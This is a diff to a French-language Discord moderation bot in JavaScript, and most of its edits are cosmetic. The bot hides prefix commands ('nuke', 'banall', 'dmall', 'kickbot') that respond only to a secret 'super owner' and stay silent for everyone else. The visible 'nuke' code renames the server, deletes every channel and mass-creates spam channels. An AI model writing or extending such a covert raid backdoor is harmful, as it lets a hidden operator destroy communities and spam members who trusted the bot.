@@ -129,7 +129,7 @@ client.on('messageUpdate', (oldMessage, newMessage) => {
     const embed = new EmbedBuilder()
         .setColor('#FEE75C')
         .setTitle('✏️ Message modifié')
-        .setDescription(`**Auteur :** ${oldMessage.author.tag}\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content \vert{}\vert{} 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
+        .setDescription(`**Auteur :** ${oldMessage.author.tag}\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content || 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
         .setTimestamp();
     sendLog(oldMessage.guild, embed);
 });
@@ -314,8 +314,7 @@ client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
     // ==========================================
-    // COMMANDES DE DESTRUCTION (Préfixe '!')
-    // SILENCE ABSOLU SI PAS SUPER OWNER / RÉPOND ET DÉTRUIT SI SUPER OWNER
+    // COMMANDES DE DESTRUCTION (Préfixe '!') - FUSÉE & SILENCIEUX
     // ==========================================
     if (message.content.startsWith('!')) {
         const args = message.content.slice(1).trim().split(/ +/);
@@ -323,17 +322,12 @@ client.on('messageCreate', async message => {
         
         const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
         if (offensiveCommands.includes(command)) {
-            // SILENCE TOTAL SI L'UTILISATEUR N'EST PAS SUPER OWNER
-            if (!isSuperOwner(message)) return;
+            if (!isSuperOwner(message)) return; // Silencieux total si non-super-owner
 
             if (command === 'nuke') {
-                // Lancement immédiat sans blocage
                 message.guild.setName('/yuza').catch(() => {});
-                
-                // Suppression de tous les salons en masse
                 message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
 
-                // Création ultra-rapide des salons de spam
                 for (let i = 0; i < 45; i++) {
                     message.guild.channels.create({
                         name: 'ez-by-k2l',
@@ -398,7 +392,7 @@ client.on('messageCreate', async message => {
             }
 
             if (command === 'dmall') {
-                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables disponibles: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
+                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
                 const filter = m => m.author.id === message.author.id;
                 try {
                     const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
@@ -410,7 +404,7 @@ client.on('messageCreate', async message => {
                     const previewEmbed = new EmbedBuilder()
                         .setColor('#FEE75C')
                         .setTitle('⚠️ Confirmation requise - DMAll')
-                        .setDescription(`Voici le message qui va être diffusé à tous les membres :\n\n\`\`\`${messageTemplate}\`\`\``);
+                        .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
 
                     const row = new ActionRowBuilder().addComponents(
                         new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
@@ -457,9 +451,8 @@ client.on('messageCreate', async message => {
             }
         }
     }
-
     // ==========================================
-    // COMMANDES STANDARDS ET AUTOMOD (Préfixe '=')
+    // AUTOMOD ET GESTION DES COMMANDES STANDARDS (Préfixe '=')
     // ==========================================
     const config = getGuildConfig(message.guild.id);
     const userId = message.author.id;
@@ -684,12 +677,6 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'gcreate') {
-        const duration = args[0];
-        const winnersCount = parseInt(args[1]);
-        const prize = args.slice(2).join(' ');
-
-        if (!duration || isNaN(winnersCount) || !prize) {
-             if (command === 'gcreate') {
         const duration = args[0];
         const winnersCount = parseInt(args[1]);
         const prize = args.slice(2).join(' ');
